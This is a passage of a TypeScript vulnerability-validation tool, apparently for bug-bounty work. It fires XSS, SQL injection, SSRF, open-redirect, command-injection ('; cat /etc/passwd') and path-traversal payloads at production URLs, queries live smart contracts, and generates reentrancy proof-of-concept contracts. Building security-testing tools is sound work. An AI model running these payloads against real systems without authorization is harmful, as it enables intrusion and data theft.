/**
 * Active Vulnerability Validator — REAL exploit testing
 *
 * THREE-STATE VERDICT MODEL (honest reporting):
 *   EXPLOITABLE     — active test confirmed the exploit works (HTTP payload reflected,
 *                     Foundry PoC passed, key accepted by API, etc.)
 *   NOT_EXPLOITABLE — active test ran and REFUTED the finding (CSP present, key rejected,
 *                     redirect didn't happen, Foundry test failed)
 *   INCONCLUSIVE    — could not determine (no URL to test, no test suite for vuln type,
 *                     network error, key found but no API endpoint to verify against)
 *
 * THREE engines for smart contracts (in order, fail-fast):
 * 1. TARGET ON-CHAIN VALIDATION (cast) — call the deployed contract on mainnet
 * 2. LAB VALIDATION (Foundry/forge) — run the PoC against a local EVM
 * 3. AGGRESSIVE FALLBACK — try multiple HTTP test suites against targetUrl
 *
 * WEB/MOBILE: HTTP-based payload testing against the production target.
 * ALL requests run in PARALLEL for speed.
 */

import { writeFileSync, mkdirSync, rmSync, existsSync, symlinkSync } from 'fs';
import { join } from 'path';
import { execSync } from 'child_process';

export type Verdict = 'EXPLOITABLE' | 'NOT_EXPLOITABLE' | 'INCONCLUSIVE';

export interface ValidationResult {
  verdict: Verdict;
  /** @deprecated Use `verdict` instead. true === (verdict === 'EXPLOITABLE'). Kept for backward compat. */
  confirmed: boolean;
  evidence: string;
  testOutput?: string;
  gasUsed?: number;
  requestUrl?: string;
  responseStatus?: number;
  responseBody?: string;
  payload?: string;
  validationScope?: 'target' | 'lab' | 'theoretical';
}

// ─── Verdict constructors — single source of truth ─────────────────
function exploitConfirmed(evidence: string, extra: Partial<ValidationResult> = {}): ValidationResult {
  return { verdict: 'EXPLOITABLE', confirmed: true, evidence, ...extra };
}
function exploitRefuted(evidence: string, extra: Partial<ValidationResult> = {}): ValidationResult {
  return { verdict: 'NOT_EXPLOITABLE', confirmed: false, evidence, ...extra };
}
function inconclusive(evidence: string, extra: Partial<ValidationResult> = {}): ValidationResult {
  return { verdict: 'INCONCLUSIVE', confirmed: false, evidence, ...extra };
}

// ─── Obvious vulnerabilities — auto-confirmed, no active test needed ─
// These are vulnerabilities where the SOURCE→SINK chain is structurally
// present in the code AND there is no possible sanitizer. Active HTTP
// testing would add nothing — the exploit is already proven by reading code.
interface ObviousVulnCheck {
  type: string;          // vuln type to set
  evidence: string;      // human-readable reason
  match: (source: string, vt: string) => boolean;
}
const OBVIOUS_VULNS: ObviousVulnCheck[] = [
  // Hardcoded private key (Ethereum) — 64 hex chars after 0x in privateKey assignment
  {
    type: 'api_leak',
    evidence: 'Hardcoded Ethereum private key found in source. This is unambiguous — anyone with source access can drain the wallet. No active testing needed.',
    match: (src) => /private[_-]?key\s*[=:]\s*['"]0x[0-9a-fA-F]{64}['"]/i.test(src) ||
                   /private[_-]?key\s*[=:]\s*['"][0-9a-fA-F]{64}['"]/i.test(src),
  },
  // Hardcoded mnemonic/seed phrase
  {
    type: 'api_leak',
    evidence: 'Hardcoded wallet mnemonic/seed phrase found in source. Anyone with source access can recreate the wallet and drain all funds. Critical — no testing needed.',
    match: (src) => /mnemonic\s*[=:]\s*['"]([a-z]+ ){11,23}[a-z]+['"]/i.test(src) ||
                   /seed[_-]?phrase\s*[=:]\s*['"]([a-z]+ ){11,23}[a-z]+['"]/i.test(src),
  },
  // eval(userInput) — direct RCE
  {
    type: 'command_injection',
    evidence: 'eval() called with user-controlled input. This is unambiguous code injection — no active testing needed. The chain input→eval is structurally present.',
    match: (src) => /eval\s*\(\s*(req\.(query|body|params)|request\.(query|body)|input|userInput|data|location\.(search|hash))/.test(src),
  },
  // SQL string concatenation with user input — direct SQLi
  {
    type: 'sql_injection',
    evidence: 'SQL query built via string concatenation with user input. Classic SQL injection — no parameterized query, no sanitization. Structurally exploitable.',
    match: (src) => {
      const sqlPatterns = [
        /query\s*\(\s*['"`].*(?:SELECT|INSERT|UPDATE|DELETE|DROP).*['"`]\s*\+\s*(?:req|request|input|user)/i,
        /execute\s*\(\s*['"`].*(?:SELECT|INSERT|UPDATE|DELETE|DROP).*['"`]\s*\+\s*(?:req|request|input|user)/i,
        /\$\{(?:req|request|input|user)[^}]*\}\s*['"`]\s*\)\s*;?\s*.*(?:SELECT|INSERT|UPDATE|DELETE|DROP)/i,
      ];
      return sqlPatterns.some(p => p.test(src));
    },
  },
  // innerHTML = location.hash / location.search — direct DOM XSS
  {
    type: 'xss',
    evidence: 'innerHTML assignment directly from location.hash/search. Proven DOM XSS — no sanitization, sink is innerHTML. Active testing would only confirm what the code already proves.',
    match: (src) => /innerHTML\s*=\s*(location\.(hash|search|href)|document\.(URL|referrer|location))/.test(src),
  },
  // document.write(location.hash) — direct DOM XSS
  {
    type: 'xss',
    evidence: 'document.write() called with location.hash/search. Direct DOM XSS sink — proven exploit chain, no active test needed.',
    match: (src) => /document\.write\s*\(\s*(location\.(hash|search|href)|document\.(URL|referrer))/.test(src),
  },
  // Solidity: selfdestruct with user-controlled target
  {
    type: 'access_control',
    evidence: 'selfdestruct called with user-controlled address. Critical — anyone can trigger contract self-destruction and redirect ETH. Structurally exploitable.',
    match: (src) => /selfdestruct\s*\(\s*(?:msg\.sender|tx\.origin|_\w+|args?\.\w+)/i.test(src),
  },
  // Solidity: tx.origin used for authorization
  {
    type: 'tx_origin',
    evidence: 'tx.origin used for authorization. Phishing attack can bypass this — proven structural vulnerability. No active testing needed.',
    match: (src) => /(?:require|if)\s*\(\s*(?:msg\.sender\s*!=?|==?\s*)tx\.origin/.test(src) ||
                   /tx\.origin\s*(?:===|==|!=)\s*[\w.]+/.test(src),
  },
  // Solidity: public mint without access control
  {
    type: 'unauthorized_mint',
    evidence: 'Public/external mint function without access control. Anyone can mint arbitrary tokens — proven structural vulnerability.',
    match: (src) => /function\s+mint\w*\s*\([^)]*\)\s*(?:public|external)\s*(?!.*(?:onlyOwner|onlyAdmin|onlyMinter|require\s*\(\s*msg\.sender\s*==\s*owner))/i.test(src),
  },
  // Solidity: delegatecall to user-supplied address
  {
    type: 'delegatecall',
    evidence: 'delegatecall to attacker-controllable address. Critical — context-preserving call allows full contract takeover. Structurally exploitable.',
    match: (src) => /\.delegatecall\s*\(\s*(?:abi\.encodeWithSignature|abi\.encodeWithSelector|bytes4\(keccak256\))/.test(src) &&
                   /(?:target|impl|implementation|_delegate|_target)\s*(?:=|:)\s*(?:msg\.sender|tx\.origin|\w+\.caller|_\w+)/i.test(src),
  },
  // Hardcoded production API key with explicit prod URL
  {
    type: 'api_leak',
    evidence: 'Hardcoded API key with production URL in same source file. Critical — credential leak is structural; active testing is unnecessary and could be harmful.',
    match: (src) => {
      const hasKey = /(?:api[_-]?key|secret|token|password|private[_-]?key)\s*[=:]\s*['"]([A-Za-z0-9_\-+/=]{20,})['"]/i.test(src);
      const hasProdUrl = /https:\/\/(?:api\.|www\.)?[a-z0-9-]+\.(?:com|io|net|org|app|exchange|defi)\b/i.test(src);
      const hasTest = /\b(test|demo|example|placeholder|your[_-]?api|changeme|xxx+)\b/i.test(src);
      return hasKey && hasProdUrl && !hasTest;
    },
  },
];

/** Check if a vulnerability is structurally obvious from source code — no active test needed. */
function checkObviousVulnerability(
  sourceCode: string,
  vulnType: string,
): { isObvious: boolean; evidence: string; matchedType: string } {
  for (const check of OBVIOUS_VULNS) {
    if (check.match(sourceCode, vulnType)) {
      // If the check matches the vuln's type OR is a more general match, treat as obvious
      if (check.type === vulnType || vulnType === 'unknown') {
        return { isObvious: true, evidence: check.evidence, matchedType: check.type };
      }
    }
  }
  return { isObvious: false, evidence: '', matchedType: '' };
}

// ═══════════════════════════════════════════════════════════════════
// SMART CONTRACT VALIDATION — TARGET ON-CHAIN (cast)
// ═══════════════════════════════════════════════════════════════════

const PUBLIC_RPCS: Record<string, string> = {
  ethereum:  'https://eth.llamarpc.com',
  bsc:       'https://bsc-dataseed.binance.org',
  polygon:   'https://polygon-rpc.com',
  arbitrum:  'https://arb1.arbitrum.io/rpc',
  optimism:  'https://mainnet.optimism.io',
  base:      'https://mainnet.base.org',
  avalanche: 'https://api.avax.network/ext/bc/C/rpc',
  fantom:    'https://rpc.ftm.tools',
};

function getRpcUrl(chain: string): string {
  const alchemy = process.env.ALCHEMY_API_KEY;
  const infura = process.env.INFURA_PROJECT_ID;
  if (alchemy) {
    const alchemyMap: Record<string, string> = {
      ethereum: `https://eth-mainnet.g.alchemy.com/v2/${alchemy}`,
      polygon: `https://polygon-mainnet.g.alchemy.com/v2/${alchemy}`,
      arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${alchemy}`,
      optimism: `https://opt-mainnet.g.alchemy.com/v2/${alchemy}`,
      base: `https://base-mainnet.g.alchemy.com/v2/${alchemy}`,
    };
    if (alchemyMap[chain]) return alchemyMap[chain];
  }
  if (infura) {
    const infuraMap: Record<string, string> = {
      ethereum: `https://mainnet.infura.io/v3/${infura}`,
      polygon: `https://polygon-mainnet.infura.io/v3/${infura}`,
      arbitrum: `https://arbitrum-mainnet.infura.io/v3/${infura}`,
      optimism: `https://optimism-mainnet.infura.io/v3/${infura}`,
      base: `https://base-mainnet.infura.io/v3/${infura}`,
    };
    if (infuraMap[chain]) return infuraMap[chain];
  }
  return PUBLIC_RPCS[chain] || PUBLIC_RPCS.ethereum;
}

/** Detect chain by trying each public RPC in parallel. 3s timeout each. */
async function detectChain(address: string): Promise<string | null> {
  const chains = Object.keys(PUBLIC_RPCS);
  const checks = await Promise.all(chains.map(async (chain) => {
    try {
      const rpc = getRpcUrl(chain);
      const code = execSync(`cast code ${address} --rpc-url ${rpc}`, {
        timeout: 3_000, encoding: 'utf-8', stdio: 'pipe',
      }).trim();
      if (code.length > 4) return chain;
    } catch {}
    return null;
  }));
  return checks.find(c => c) || null;
}

interface OnChainState {
  owner: string | null;
  paused: boolean | null;
  totalSupply: string | null;
  balance: string | null;
  bytecodeSize: number;
}

async function queryOnChainState(address: string, chain: string): Promise<OnChainState> {
  const rpc = getRpcUrl(chain);
  const state: OnChainState = {
    owner: null, paused: null, totalSupply: null, balance: null, bytecodeSize: 0,
  };
  try {
    const code = execSync(`cast code ${address} --rpc-url ${rpc}`, {
      timeout: 3_000, encoding: 'utf-8', stdio: 'pipe',
    }).trim();
    state.bytecodeSize = Math.floor((code.length - 2) / 2);
  } catch {}
  const callView = (selector: string): string | null => {
    try {
      const out = execSync(`cast call ${address} ${selector} --rpc-url ${rpc}`, {
        timeout: 3_000, encoding: 'utf-8', stdio: 'pipe',
      }).trim();
      return out && out.startsWith('0x') && out.length >= 66 ? out : null;
    } catch { return null; }
  };
  const ownerRaw = callView('0x8da5cb5b');
  if (ownerRaw) { state.owner = '0x' + ownerRaw.slice(-40).toLowerCase(); }
  if (!state.owner) {
    const adminRaw = callView('0xf851a440');
    if (adminRaw) { state.owner = '0x' + adminRaw.slice(-40).toLowerCase(); }
  }
  const pausedRaw = callView('0x5c975abb');
  if (pausedRaw) state.paused = pausedRaw.slice(-2) === '01';
  const supplyRaw = callView('0x18160ddd');
  if (supplyRaw) state.totalSupply = BigInt(supplyRaw).toString();
  try {
    const bal = execSync(`cast balance ${address} --rpc-url ${rpc}`, {
      timeout: 3_000, encoding: 'utf-8', stdio: 'pipe',
    }).trim();
    if (bal && /^\d+$/.test(bal)) state.balance = bal;
  } catch {}
  return state;
}

async function validateWithCastOnChain(
  vuln: { type: string; title: string; severity: string; description: string; location: string },
  contractAddress: string,
  chain?: string,
): Promise<ValidationResult> {
  let actualChain = chain || '';
  if (!actualChain) {
    actualChain = (await detectChain(contractAddress)) || '';
    if (!actualChain) {
      return inconclusive(`[TARGET-VALIDATION SKIPPED] Could not detect chain for ${contractAddress}.`,
        { validationScope: 'theoretical' });
    }
  }
  let state: OnChainState;
  try { state = await queryOnChainState(contractAddress, actualChain); }
  catch (e: any) { return inconclusive(`[TARGET-VALIDATION ERROR] ${String(e.message || e).slice(0, 200)}`,
    { validationScope: 'theoretical' }); }
  const ev: string[] = [`[TARGET-VALIDATED] Queried ${contractAddress} on ${actualChain}. Bytecode: ${state.bytecodeSize} bytes.`];
  if (state.owner) ev.push(`owner(): ${state.owner}`);
  if (state.paused !== null) ev.push(`paused(): ${state.paused}`);
  if (state.totalSupply) ev.push(`totalSupply(): ${state.totalSupply}`);
  if (state.balance) ev.push(`ETH balance: ${state.balance} wei`);
  let confirmed = false;
  let refuted = false;
  const vt = vuln.type.toLowerCase();
  if ((vt === 'access_control' || vt === 'unauthorized_mint' || vt === 'governance_hijack') && state.owner) {
    if (/^0x0{40}$/i.test(state.owner)) { ev.push(`[TARGET-CONFIRMS] Owner is zero address.`); confirmed = true; }
    else { try { const oc = execSync(`cast code ${state.owner} --rpc-url ${getRpcUrl(actualChain)}`, { timeout: 3_000, encoding: 'utf-8', stdio: 'pipe' }).trim();
      if (oc.length <= 4) { ev.push(`[TARGET-CONFIRMS] Owner ${state.owner} is EOA.`); confirmed = true; }
      else { ev.push(`[TARGET-PARTIAL] Owner is contract (timelock/multisig).`); } } catch {} }
  }
  if ((vt === 'reentrancy' || vt === 'flash_loan' || vt === 'delegatecall') && state.balance) {
    if (BigInt(state.balance) > 0n) { ev.push(`[TARGET-CONFIRMS] Contract holds ${state.balance} wei.`); confirmed = true; }
  }
  if ((vt === 'denial_of_service' || vt === 'permanent_pause') && state.paused !== null) {
    if (state.paused) { ev.push(`[TARGET-CONFIRMS] Contract is paused.`); confirmed = true; }
    else { ev.push(`[TARGET-REFUTES] Contract is NOT paused.`); refuted = true; }
  }
  if (confirmed) return exploitConfirmed(ev.join('\n'), { validationScope: 'target' });
  if (refuted) return exploitRefuted(ev.join('\n'), { validationScope: 'target' });
  // Queried on-chain state but no clear verdict — INCONCLUSIVE, not "confirmed: false"
  return inconclusive(ev.join('\n') + `\n[INCONCLUSIVE] On-chain state queried but does not clearly confirm or refute the vuln.`,
    { validationScope: 'target' });
}

// ═══════════════════════════════════════════════════════════════════
// SMART CONTRACT VALIDATION (Foundry) — LAB SCOPE
// ═══════════════════════════════════════════════════════════════════

function generatePoCTest(sourceCode: string, contractName: string, vuln: any): string {
  const vt = vuln.type.toLowerCase();
  const pocMap: Record<string, string> = {
    reentrancy: `contract ReentrancyAttack { IVulnerable victim; function attack() external payable { victim.deposit{value: msg.value}(); victim.withdraw(); } receive() external payable { if (address(victim).balance >= 1 ether) victim.withdraw(); } }`,
    access_control: `contract AccessControlAttack { function testUnauthorized() public { vm.prank(attacker); target.setOwner(attacker); } }`,
    integer_overflow: `contract IntegerOverflowTest { function testOverflow() public { target.deposit(type(uint256).max); } }`,
  };
  const poc = pocMap[vt] || `contract PoCTest { function testVuln() public { /* generic test */ } }`;
  return `// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\nimport "forge-std/Test.sol";\ninterface IVulnerable { function deposit() external payable; function withdraw() external; }\n${poc}`;
}

async function validateWithFoundry(sourceCode: string, contractName: string, vuln: any): Promise<ValidationResult> {
  const nameMatch = sourceCode.match(/contract\s+(\w+)\s*[{(:]/);
  const actualName = contractName || nameMatch?.[1] || 'Target';
  const tmpDir = `/tmp/foundry-${Date.now()}`;
  try {
    mkdirSync(join(tmpDir, 'src'), { recursive: true });
    mkdirSync(join(tmpDir, 'test'), { recursive: true });
    writeFileSync(join(tmpDir, 'src', `${actualName}.sol`), sourceCode);
    writeFileSync(join(tmpDir, 'test', 'PoC.t.sol'), generatePoCTest(sourceCode, actualName, vuln));
    writeFileSync(join(tmpDir, 'foundry.toml'), `[profile.default]\nsrc="src"\nout="out"\nlibs=["lib"]\nsolc_version="0.8.20"\noptimizer=true\n`);
    const FORGE_STD_CACHE = '/opt/forge-lib/forge-std';
    const forgeStdLink = join(tmpDir, 'lib', 'forge-std');
    try {
      mkdirSync(join(tmpDir, 'lib'), { recursive: true });
      if (existsSync(FORGE_STD_CACHE)) { try { symlinkSync(FORGE_STD_CACHE, forgeStdLink, 'dir'); } catch {} }
      else { try { execSync('git init && git add -A && git commit -m init', { cwd: tmpDir, timeout: 5_000, stdio: 'pipe' }); } catch {}
        try { execSync('forge install foundry-rs/forge-std --no-commit --no-git', { cwd: tmpDir, timeout: 30_000, stdio: 'pipe' });
          try { mkdirSync('/opt/forge-lib', { recursive: true }); execSync(`cp -r ${forgeStdLink} ${FORGE_STD_CACHE}`, { timeout: 10_000, stdio: 'pipe' }); } catch {} } catch {} }
    } catch {}
    const result = execSync('forge test -vvv 2>&1', { cwd: tmpDir, timeout: 30_000, encoding: 'utf-8', stdio: 'pipe' });
    const passed = result.includes('[PASS]') || result.includes('SUCCESS');
    const gasMatch = result.match(/(\d+)\s+gas/);
    if (passed) return exploitConfirmed(
      `Foundry PoC PASSED. Gas: ${gasMatch?.[1] || 'n/a'}. This confirms the exploit works in a local EVM, NOT that the deployed contract is exploitable.`,
      { validationScope: 'lab', testOutput: result.slice(0, 2000), gasUsed: gasMatch ? parseInt(gasMatch[1]) : undefined });
    // Foundry ran but PoC failed — exploit REFUTED under lab conditions
    return exploitRefuted(`Foundry PoC FAILED — exploit did not succeed under lab conditions.`,
      { validationScope: 'lab', testOutput: result.slice(0, 2000) });
  } catch (e: any) {
    // Foundry crashed (compile error, missing deps, timeout) — INCONCLUSIVE, not "refuted"
    return inconclusive(`Foundry error: ${String(e.message || e).slice(0, 300)}`,
      { validationScope: 'theoretical' });
  }
  finally { try { rmSync(tmpDir, { recursive: true, force: true }); } catch {} }
}

// ═══════════════════════════════════════════════════════════════════
// WEB VULNERABILITY VALIDATION (HTTP-based real testing)
//
// ─── STRICT CLASS-MATCHING POLICY ──────────────────────────────────
// A finding can ONLY be upgraded to EXPLOITABLE if the active test
// confirms the SPECIFIC vulnerability class that was claimed.
//
//   Hypothesis: IDOR
//      ↓ Validator tests
//   Did attacker access another user's resource?
//      ↓ NO
//   NOT_EXPLOITABLE (or INCONCLUSIVE if we couldn't test IDOR specifically)
//
// The aggressive fallback (which runs when no specific test suite exists
// for the claimed type) can NEVER upgrade a finding to EXPLOITABLE.
// If it finds a DIFFERENT vuln class, that's a separate hypothesis —
// it returns INCONCLUSIVE with a note about what was found.
//
// This policy prioritizes PRECISION over RECALL. For bug bounty:
//   2 real confirmed bugs > 50 speculative HIGH/CRITICAL findings.
// ═══════════════════════════════════════════════════════════════════

interface WebTestPayload {
  name: string;
  vulnType: string;  // Maps to the vuln type this suite confirms
  payloads: string[];
  check: (response: { status: number; body: string; headers: Record<string, string> }, payload: string) => boolean;
  evidence: (response: { status: number; body: string; headers: Record<string, string> }, payload: string) => string;
}

const XSS_PAYLOADS: WebTestPayload = {
  name: 'XSS',
  vulnType: 'xss',
  payloads: ['<img src=x onerror=alert(1)>', '"><svg onload=alert(1)>', '<svg onload=alert(1)>'],
  check: (resp, payload) => {
    // STRICT: payload must be reflected UNENCODED in the HTML body.
    // If the payload contains < > and they are HTML-encoded (&lt; &gt;),
    // body.includes(decoded) will NOT match — which is correct (no XSS).
    let decoded = payload; try { decoded = decodeURIComponent(payload); } catch {}
    const body = resp.body.toLowerCase();
    if (body.includes(decoded.toLowerCase())) return true;
    // Do NOT use the loose 'onerror=alert' substring check — it matches
    // documentation pages, error messages, and our own payload in JSON APIs.
    return false;
  },
  evidence: (resp, payload) => `XSS CONFIRMED: Payload "${payload}" reflected unescaped in HTML body. HTTP ${resp.status}.`,
};

const SQLI_PAYLOADS: WebTestPayload = {
  name: 'SQL Injection',
  vulnType: 'sql_injection',
  payloads: ["' OR '1'='1", "' OR '1'='1' --", "admin'--"],
  check: (resp, _payload) => {
    // STRICT: only match actual SQL error messages from database engines.
    // These strings are unambiguous — they don't appear in normal HTML.
    const body = resp.body.toLowerCase();
    const sqlErrors = [
      'sql syntax', 'mysql_fetch', 'ORA-', 'ERROR:  syntax error',
      'unclosed quotation mark', 'sqlite3.OperationalError', 'SQLSTATE',
      'you have an error in your sql syntax', 'PG::SyntaxError',
      'Microsoft SQL Server', 'SQLServer JDBC Driver',
    ];
    if (sqlErrors.some(e => body.includes(e.toLowerCase()))) return true;
    // Also check for boolean-based SQLi: response differs between
    // ' OR '1'='1 (true) and ' OR '1'='2 (false) — but we don't send
    // the false payload here, so we can't confirm boolean-based.
    return false;
  },
  evidence: (resp, payload) => `SQL INJECTION CONFIRMED: Payload "${payload}" triggered database error message. HTTP ${resp.status}.`,
};

const SSRF_PAYLOADS: WebTestPayload = {
  name: 'SSRF',
  vulnType: 'ssrf',
  payloads: ['http://169.254.169.254/latest/meta-data/', 'http://localhost:80', 'http://127.0.0.1:80'],
  check: (resp, payload) => {
    // STRICT: only match actual cloud metadata content.
    // The old check matched body.includes('ssh') — which appears on
    // virtually every page (CSS classes, "press shift", SSH key docs, etc.)
    // and body.includes('connection refused') — which appears in error docs.
    const body = resp.body.toLowerCase();
    if (payload.includes('169.254.169.254')) {
      // AWS metadata content — unambiguous
      const awsMarkers = ['ami-id', 'instance-id', 'security-credentials',
        'iam/security-credentials', 'instance-metadata',
        'aki-', 'reservation-id', 'local-ipv4'];
      if (awsMarkers.some(m => body.includes(m))) return true;
    }
    // For localhost payloads: check for actual internal service signatures
    // (e.g. "It works!" from Apache, nginx default page, X-Powered-By with internal IP)
    // Do NOT match 'ssh' or 'connection refused' — too generic.
    if (payload.includes('localhost') || payload.includes('127.0.0.1')) {
      if (body.includes('<title>apache2 ubuntu default page')) return true;
      if (body.includes('welcome to nginx')) return true;
      if (resp.headers['x-powered-by']?.includes('Express')) return true;
    }
    return false;
  },
  evidence: (resp, payload) => `SSRF CONFIRMED: Server fetched internal URL "${payload}" and returned internal content. HTTP ${resp.status}.`,
};

const REDIRECT_PAYLOADS: WebTestPayload = {
  name: 'Open Redirect',
  vulnType: 'open_redirect',
  payloads: ['https://evil.com', '//evil.com', 'https:evil.com'],
  check: (resp, payload) => {
    // STRICT: Location header must contain the attacker domain.
    // HTTP 3xx + Location: evil.com is unambiguous.
    const location = resp.headers['location'] || '';
    if (location.includes('evil.com')) return true;
    return false;
  },
  evidence: (resp, payload) => `OPEN REDIRECT CONFIRMED: Location header redirects to "${resp.headers['location'] || 'N/A'}". HTTP ${resp.status}.`,
};

const CMDI_PAYLOADS: WebTestPayload = {
  name: 'Command Injection',
  vulnType: 'command_injection',
  payloads: ['; id', '| id', '&& whoami', '; cat /etc/passwd'],
  check: (resp, payload) => {
    // STRICT: only match actual command output.
    // The old check matched body.includes('root') — which appears on
    // virtually every 404 page ("root element", "root domain", "document root",
    // "root path", etc.). This caused massive false positives.
    const body = resp.body;
    // `id` command output: uid=NNN(...) gid=NNN(...) groups=...
    if (/uid=\d+\([^)]*\)\s+gid=\d+/.test(body)) return true;
    // /etc/passwd content: root:x:0:0:root:/root:/bin/bash
    if (/root:x:0:0:[^:]*:\/root:\/bin\/(bash|sh|zsh)/.test(body)) return true;
    // `whoami` output: must be a standalone line with just the username
    // (not "root" appearing somewhere in HTML)
    if (payload.includes('whoami')) {
      // Check if body has a line that is EXACTLY a username (root, www-data, nginx, etc.)
      // This must be a bare line, not "root" inside other text.
      if (/^root$/m.test(body) || /^www-data$/m.test(body) || /^nginx$/m.test(body)) return true;
    }
    return false;
  },
  evidence: (resp, payload) => `COMMAND INJECTION CONFIRMED: Payload "${payload}" produced command output in response. HTTP ${resp.status}.`,
};

const PATH_TRAVERSAL_PAYLOADS: WebTestPayload = {
  name: 'Path Traversal',
  vulnType: 'path_traversal',
  payloads: ['../../../etc/passwd', '../../../../windows/win.ini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'],
  check: (resp, _payload) => {
    // STRICT: only match actual /etc/passwd or win.ini content.
    // These patterns are unambiguous — they don't appear in normal HTML.
    const body = resp.body.toLowerCase();
    // /etc/passwd: root:x:0:0:... (full line, not just "root")
    if (/root:x:0:0:[^:]*:\/root:\/bin\/(bash|sh)/.test(body)) return true;
    if (body.includes('daemon:x:1:1:') || body.includes('bin:x:2:2:')) return true;
    // win.ini: [fonts] or [extensions] section headers
    if (body.includes('[fonts]') || body.includes('[extensions]')) return true;
    return false;
  },
  evidence: (resp, payload) => `PATH TRAVERSAL CONFIRMED: Payload "${payload}" returned system file content. HTTP ${resp.status}.`,
};

const CORS_TEST: WebTestPayload = {
  name: 'CORS Misconfiguration',
  vulnType: 'cors_misconfig',
  payloads: ['https://evil.com', 'null'],
  check: (resp, _payload) => {
    const acao = resp.headers['access-control-allow-origin'] || '';
    const acac = resp.headers['access-control-allow-credentials'] || '';
    if (acao === '*' && acac === 'true') return true;
    if (acao && acao !== 'null' && acac === 'true') return true;
    if (acao === 'null' && acac === 'true') return true;
    return false;
  },
  evidence: (resp, payload) => `CORS CONFIRMED: ACAO=${resp.headers['access-control-allow-origin'] || '(none)'} ACAC=${resp.headers['access-control-allow-credentials'] || '(none)'} Origin=${payload}.`,
};

const BROWSER_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.9',
};

async function sendTestRequest(url: string, method: string, payload: string, param: string,
  options: { timeoutMs?: number; followRedirect?: boolean } = {}): Promise<{ status: number; body: string; headers: Record<string, string>; finalUrl: string }> {
  const { timeoutMs = 5_000, followRedirect = true } = options;
  try {
    const params = new URLSearchParams();
    params.set(param, payload);
    const init: RequestInit = { method: method.toUpperCase(), headers: { 'Content-Type': 'application/x-www-form-urlencoded', ...BROWSER_HEADERS },
      signal: AbortSignal.timeout(timeoutMs), redirect: followRedirect ? 'follow' : 'manual' };
    let targetUrl = url;
    if (method.toUpperCase() === 'GET') { const u = new URL(url); u.searchParams.set(param, payload); targetUrl = u.toString(); }
    else { init.body = params.toString(); }
    const resp = await fetch(targetUrl, init);
    const body = await resp.text();
    const headers: Record<string, string> = {};
    resp.headers.forEach((v, k) => { headers[k] = v; });
    return { status: resp.status, body, headers, finalUrl: resp.url || targetUrl };
  } catch { return { status: 0, body: '', headers: {}, finalUrl: url }; }
}

async function discoverTargetParameters(targetUrl: string): Promise<string[]> {
  const discovered = new Set<string>();
  try { const u = new URL(targetUrl); u.searchParams.forEach((_, key) => discovered.add(key)); } catch {}
  try {
    const resp = await fetch(targetUrl, { headers: BROWSER_HEADERS, signal: AbortSignal.timeout(5_000) });
    const html = await resp.text();
    const inputMatches = html.matchAll(/<input[^>]+name=["']([^"']+)["']/gi);
    for (const m of inputMatches) { const name = m[1].trim(); if (name && !name.startsWith('_')) discovered.add(name); }
    const hrefMatches = html.matchAll(/<a[^>]+href=["']([^"']+)["']/gi);
    for (const m of hrefMatches) { try { const url = m[1].startsWith('http') ? new URL(m[1]) : new URL(m[1], targetUrl);
      url.searchParams.forEach((_, key) => discovered.add(key)); } catch {} }
  } catch {}
  const skip = /^(csrf|_token|__|authenticity_token|nonce|session|sid)$/i;
  const filtered = [...discovered].filter(p => !skip.test(p));
  if (filtered.length === 0) filtered.push('q', 'search', 'query', 'id', 'url', 'redirect', 'next', 'return');
  return filtered.slice(0, 3);
}

function extractParamFromVuln(vuln: { location: string; description: string }): string | null {
  const text = `${vuln.location || ''} ${vuln.description || ''}`;
  const m1 = text.match(/param(?:eter)?[=:]\s*([A-Za-z_][A-Za-z0-9_]*)/i);
  if (m1) return m1[1];
  const m2 = text.match(/[?&]([A-Za-z_][A-Za-z0-9_]*)=/);
  if (m2) return m2[1];
  const m3 = text.match(/(?:via|in the)\s*\?([A-Za-z_][A-Za-z0-9_]*)/i);
  if (m3) return m3[1];
  return null;
}

async function validateWebVulnerability(targetUrl: string, vuln: any, sourceCode: string = ''): Promise<ValidationResult> {
  const vulnType = vuln.type.toLowerCase();
  let testSuite: WebTestPayload | null = null;
  if (vulnType === 'xss') testSuite = XSS_PAYLOADS;
  else if (vulnType === 'sql_injection') testSuite = SQLI_PAYLOADS;
  else if (vulnType === 'ssrf') testSuite = SSRF_PAYLOADS;
  else if (vulnType === 'open_redirect') testSuite = REDIRECT_PAYLOADS;
  else if (vulnType === 'command_injection') testSuite = CMDI_PAYLOADS;
  else if (vulnType === 'path_traversal') testSuite = PATH_TRAVERSAL_PAYLOADS;
  else if (vulnType === 'cors_misconfig') testSuite = CORS_TEST;

  // ─── Configuration checks: always testable via HTTP headers ──────
  if (vulnType === 'csp_missing' || vulnType === 'csrf' || vulnType === 'auth_bypass' ||
      vulnType === 'info_exposure' || vulnType === 'clickjacking' || vulnType === 'session_fixation') {
    try {
      const resp = await fetch(targetUrl, { headers: BROWSER_HEADERS, signal: AbortSignal.timeout(8_000) });
      const headers: Record<string, string> = {};
      resp.headers.forEach((v, k) => { headers[k] = v; });

      // CSP check
      if (vulnType === 'csp_missing') {
        const csp = headers['content-security-policy'] || '';
        if (!csp) return exploitConfirmed(
          `CSP header ABSENT — confirmed via real HTTP request to ${targetUrl}. Response has no Content-Security-Policy. This is a confirmed configuration weakness.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
        if (csp.includes("'unsafe-inline'") || csp.includes('https:')) return exploitConfirmed(
          `CSP is WEAK — contains 'unsafe-inline' or https: wildcard: ${csp.slice(0, 200)}. Inline scripts are allowed, reducing XSS protection to zero.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
        // CSP present and strict — refuted
        return exploitRefuted(`CSP is PRESENT and strict: ${csp.slice(0, 200)}. Not exploitable.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
      }

      // Clickjacking check
      if (vulnType === 'clickjacking') {
        const xfo = headers['x-frame-options'] || '';
        const csp = headers['content-security-policy'] || '';
        if (!xfo && !csp.includes('frame-ancestors')) return exploitConfirmed(
          `X-Frame-Options ABSENT and CSP has no frame-ancestors — page is frameable. Clickjacking confirmed.`,
          { validationScope: 'target', requestUrl: targetUrl, responseStatus: resp.status });
